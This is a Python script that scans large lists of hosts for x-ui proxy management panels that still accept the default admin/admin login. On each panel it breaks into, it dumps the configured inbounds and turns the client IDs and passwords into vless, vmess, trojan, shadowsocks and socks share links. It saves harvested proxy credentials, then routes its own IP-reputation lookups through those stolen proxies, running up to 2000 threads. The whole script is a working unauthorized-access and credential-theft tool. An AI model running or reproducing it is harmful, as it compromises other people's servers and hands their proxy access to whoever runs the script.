import sys
import os
import csv
import requests
import json
import re
from bs4 import BeautifulSoup
import base64
import urllib.parse
import urllib3
from concurrent.futures import ThreadPoolExecutor
import warnings
import random

script_dir = os.path.dirname(os.path.abspath(__file__))

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.simplefilter('ignore', requests.packages.urllib3.exceptions.InsecureRequestWarning)

hosts_dir = os.path.join(script_dir, 'hosts')
hosts = []
for filename in os.listdir(hosts_dir):
    filepath = os.path.join(hosts_dir, filename)
    with open(filepath, 'r') as file:
        for line in file:
            match = re.search(r"(https?://)?([\w.-]+)(:\d+)?/?", line)
            if match:
                host = match.group(0).strip()
                if not host.startswith("http"):
                    host = "http://" + host
                hosts.append(host)

results_dir = os.path.join(script_dir, 'results')
os.makedirs(results_dir, exist_ok=True)
result_filename = "risk.csv"
nodes_filename = "node.txt"


def fetch_ip_risk(host):
    host = re.sub(r"https?://", "", host)
    host = re.sub(r":\d+$", "", host)

    try:
        response = requests.get(f"https://scamalytics.com/ip/{host}")
        response.raise_for_status()

        soup = BeautifulSoup(response.text, "html.parser")

        fraud_risk_element = soup.find("div", class_="panel_title")
        fraud_risk = fraud_risk_element.text.strip() if fraud_risk_element else "Not found"

        fraud_score_element = soup.find("div", class_="score")
        fraud_score = fraud_score_element.text.split(":")[1].strip() if fraud_score_element else "Not found"

        country_element = soup.find("th", string="Country Name").find_next_sibling("td")
        country = country_element.text.strip() if country_element else "Not found"

        city_element = soup.find("th", string="City").find_next_sibling("td")
        city = city_element.text.strip() if city_element else "Not found"

        vpn_element = soup.find("th", string="Anonymizing VPN").find_next_sibling("td")
        vpn_status = vpn_element.text.strip() if vpn_element else "Not found"

        return {
            "fraud_risk": fraud_risk,
            "fraud_score": fraud_score,
            "country": country,
            "city": city,
            "vpn_status": vpn_status
        }

    except requests.exceptions.RequestException as e:
        return None


def get_risk_score(ip_address):
    with open("ips.txt", "r") as f:
        ips = [line.strip() for line in f]

    proxy = random.choice(ips)

    proxies = {
        "http": proxy,
        "https": proxy
    }

    url = f"https://ping0.cc/ip/{ip_address}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0"
    }

    try:
        response = requests.get(url, headers=headers, proxies=proxies, verify=False, timeout=10)
    except Exception:
        return None

    if response.status_code != 200:
        return None

    jskey_match = re.search(r"window\.x\s*=\s*'([a-zA-Z0-9]+)'", response.text)
    if jskey_match:
        jskey = jskey_match.group(1)
    else:
        return None

    cookies = {"jskey": jskey}
    try:
        response = requests.get(url, headers=headers, cookies=cookies, proxies=proxies, verify=False, timeout=10)
    except Exception:
        return None

    if response.status_code != 200:
        return None

    soup = BeautifulSoup(response.content, "html.parser")

    risk_item = soup.find("div", class_="riskitem riskcurrent")

    risk_score = None
    risk_label = None

    if risk_item:
        risk_score = risk_item.find("span", class_="value").text.strip() if risk_item.find("span",
                                                                                           class_="value") else None
        risk_label = risk_item.find("span", class_="lab").text.strip() if risk_item.find("span", class_="lab") else None

    ip_type_element = soup.find("div", class_="line line-iptype").find("div", class_="content")
    ip_type = ip_type_element.text.strip() if ip_type_element else None

    native_ip_element = soup.find("div", class_="line line-nativeip").find("div", class_="content")
    native_ip = native_ip_element.text.strip() if native_ip_element else None

    asn_owner_element = soup.find("div", class_="line asnname").find("div", class_="content")
    asn_owner = asn_owner_element.text.strip() if asn_owner_element else None

    return {
        "ip_type": ip_type,
        "native_ip": native_ip,
        "asn_owner": asn_owner,
        "risk_score": risk_score,
        "risk_label": risk_label
    }


def test_login(host):
    login_url = f"{host}/login"
    payload = "username=admin&password=admin"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "x-requested-with": "XMLHttpRequest",
        "referrer": f"{host}/",
        "referrerPolicy": "strict-origin-when-cross-origin"
    }

    try:
        with requests.Session() as session:
            response = session.post(login_url, headers=headers, data=payload, allow_redirects=False, timeout=10)

            if response.status_code == 200:
                try:
                    response_json = response.json()
                    if response_json.get("success") == True:
                        host_address_with_port = host.split('://')[1].split('/')[0]

                        ip_address = host_address_with_port.split(':')[0]

                        ip_risk_info = fetch_ip_risk(ip_address)
                        ping0_info = get_risk_score(ip_address)

                        with open(os.path.join(results_dir, result_filename), 'a', newline='',
                                  encoding='utf-8-sig') as file:
                            writer = csv.writer(file)
                            if file.tell() == 0:
                                writer.writerow(
                                    ["主机地址", "地理位置", "欺诈风险", "欺诈分数", "是否使用匿名 VPN",
                                     "ping0 IP 类型", "ping0 原生 IP", "ping0 ASN 所有者", "ping0 风险评分",
                                     "ping0 风险等级"])

                            if ping0_info:
                                ping0_ip_types = [t.strip() for t in ping0_info['ip_type'].split('\n') if t.strip()]
                                ping0_ip_type = ', '.join(ping0_ip_types)

                                ping0_native_ips = [t.strip() for t in ping0_info['native_ip'].split('\n') if t.strip()]
                                ping0_native_ip = ', '.join(ping0_native_ips)

                                asn_owner_parts = ping0_info['asn_owner'].split("—")
                                asn_name = asn_owner_parts[0].strip()

                                asn_domain_match = re.search(r"$([^)]+)$", asn_owner_parts[1]) if len(
                                    asn_owner_parts) > 1 else None
                                asn_domain = asn_domain_match.group(1).replace('\n', '\\n') if asn_domain_match else ""

                                idc_label = ""
                                if "IDC" in asn_name:
                                    idc_label = "(IDC)"
                                    asn_name = asn_name.replace("IDC", "").strip()

                                ping0_asn_owner = f"{asn_name} {idc_label} {asn_domain}"

                                ping0_risk_score = ping0_info['risk_score']
                                ping0_risk_label = ping0_info['risk_label']
                            else:
                                ping0_ip_type = ping0_native_ip = ping0_asn_owner = ping0_risk_score = ping0_risk_label = "N/A"

                            if ip_risk_info:
                                ip_location = f"{ip_risk_info.get('country', 'N/A')}, {ip_risk_info.get('city', 'N/A')}"
                                ip_fraud_risk = ip_risk_info.get("fraud_risk", "N/A")
                                ip_fraud_score = ip_risk_info.get("fraud_score", "N/A")
                                ip_vpn_status = ip_risk_info.get("vpn_status", "N/A")
                            else:
                                ip_location = ip_fraud_risk = ip_fraud_score = ip_vpn_status = "N/A"

                            writer.writerow([host_address_with_port,
                                             ip_location,
                                             ip_fraud_risk,
                                             ip_fraud_score,
                                             ip_vpn_status,
                                             ping0_ip_type,
                                             ping0_native_ip,
                                             ping0_asn_owner,
                                             ping0_risk_score,
                                             ping0_risk_label])
                        return True

                except json.JSONDecodeError:
                    pass
            else:
                pass
    except requests.exceptions.RequestException:
        pass
    return False


def getSession(url, username="admin", password="admin"):
    login_url = f"{url}/login"
    data = {"username": username, "password": password}
    headers = {
        "Accept": "application/json, text/plain, /",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    }
    try:
        response = requests.post(login_url, data=data, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            return response.cookies.get("session")
    except requests.exceptions.RequestException:
        pass
    return None


def get_inbound_list(url, session_cookie):
    inbound_url = f"{url}/xui/inbound/list"
    headers = {
        "Accept": "application/json, text/plain, /",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Cookie": f"session={session_cookie}",
    }
    try:
        response = requests.post(inbound_url, headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
            return response.json()
    except requests.exceptions.RequestException:
        pass
    return None


def generate_subscription_links(data, server_address, file_handle, node_file_handle, results_dir, nodes_filename):
    with open(os.path.join(results_dir, nodes_filename), 'a', encoding='utf-8') as node_file_handle:
        if data and data["success"]:
            for item in data["obj"]:
                if item["enable"]:
                    try:
                        stream_settings = json.loads(item["streamSettings"])
                        settings = json.loads(item["settings"])
                    except json.JSONDecodeError:
                        continue

                    protocol = item["protocol"]
                    port = item["port"]
                    security = stream_settings["security"]
                    network = stream_settings["network"]

                    if protocol == "vless":
                        for client in settings["clients"]:
                            client_id = client["id"]
                            path = stream_settings.get("wsSettings", {}).get("path", "/")
                            host = stream_settings.get("wsSettings", {}).get("headers", {}).get("Host", server_address)

                            query = f"type={network}&security={security}&path={urllib.parse.quote(path)}&host={urllib.parse.quote(host)}"
                            if security == "tls":
                                query += "&sni=" + host

                            link = f"vless://{client_id}@{server_address}:{port}?{query}#{urllib.parse.quote(item['remark'])}"
                            node_file_handle.write(f"{link}\n")

                    elif protocol == "vmess":
                        for client in settings["clients"]:
                            client_id = client["id"]
                            path = stream_settings.get("wsSettings", {}).get("path", "/")
                            host = stream_settings.get("wsSettings", {}).get("headers", {}).get("Host", server_address)

                            vmess_config = {
                                "v": "2", "ps": item["remark"], "add": server_address, "port": port,
                                "id": client_id, "aid": "0", "net": network, "type": "none",
                                "host": host, "path": path, "tls": "tls" if security == "tls" else ""
                            }
                            link = f"vmess://{base64.urlsafe_b64encode(json.dumps(vmess_config).encode()).decode().rstrip('=')}"
                            node_file_handle.write(f"{link}\n")

                    elif protocol == "trojan":
                        for client in settings["clients"]:
                            password = client["password"]
                            link = f"trojan://{password}@{server_address}:{port}#{urllib.parse.quote(item['remark'])}"
                            node_file_handle.write(f"{link}\n")

                    elif protocol == "shadowsocks":
                        for client in settings.get("clients", []):
                            method = settings["method"]
                            password = client.get("password", "")
                            ss_config = f"{method}:{password}@{server_address}:{port}"
                            link = f"ss://{base64.urlsafe_b64encode(ss_config.encode()).decode().rstrip('=')}#{urllib.parse.quote(item['remark'])}"
                            node_file_handle.write(f"{link}\n")

                    elif protocol == "socks":
                        for client in settings.get("accounts", []):
                            username = client.get("user", "")
                            password = client.get("pass", "")
                            auth_str = f"{username}:{password}" if username and password else ""
                            link = f"socks://{base64.b64encode(auth_str.encode() if auth_str else b'').decode()}@{server_address}:{port}#{urllib.parse.quote(item['remark'])}"
                            node_file_handle.write(f"{link}\n")
                            with open("ips.txt", "a") as ips_file:
                                if username == "" and password == "":
                                    ips_file.write(f"{server_address}:{port}\n")
                                else:
                                    ips_file.write(f"socks://{username}:{password}@{server_address}:{port}\n")

                    elif protocol == "http":
                        for account in settings.get("accounts", []):
                            username = account.get("user", "")
                            password = account.get("pass", "")
                            with open("ips.txt", "a") as ips_file:
                                if username == "" and password == "":
                                    ips_file.write(f"{server_address}:{port}\n")
                                else:
                                    ips_file.write(f"http://{username}:{password}@{server_address}:{port}\n")

                    else:
                        print(f"Unsupported protocol: {protocol} for {item['remark']}")
                        continue

        else:
            print(f"Failed to get valid data for {server_address}")


def get_subscription_links(url, file_handle, node_file_handle):
    if not url.startswith('http://') and not url.startswith('https://'):
        url = f'http://{url}'

    print(f"Entering get_subscription_links for {url}")

    print(f"Processing {url}")
    session = getSession(url)
    if not session:
        print(f"Failed to get session for {url}")
        return

    inbound_list = get_inbound_list(url, session)
    if not inbound_list:
        print(f"Failed to get inbound list for {url}")
        return

    server_address = url.split('://')[1].split(':')[0]
    print(f"Calling generate_subscription_links for {server_address}")

    generate_subscription_links(inbound_list, server_address, file_handle, node_file_handle, results_dir,
                                nodes_filename)


def process_host(host):
    if test_login(host):
        with open(os.path.join(results_dir, result_filename), 'a', newline='', encoding='utf-8-sig') as result_file, \
                open(os.path.join(results_dir, nodes_filename), 'a', encoding='utf-8') as node_file:
            print(f"Calling get_subscription_links for {host}")
            get_subscription_links(host, result_file, node_file)


def main():
    with open(os.path.join(results_dir, result_filename), 'w', newline='', encoding='utf-8-sig') as _, \
            open(os.path.join(results_dir, nodes_filename), 'w', encoding='utf-8') as _:
        pass

    with ThreadPoolExecutor(max_workers=2000) as executor:
        executor.map(process_host, hosts)

    print("Python script finished.")


if __name__ == '__main__':
    main()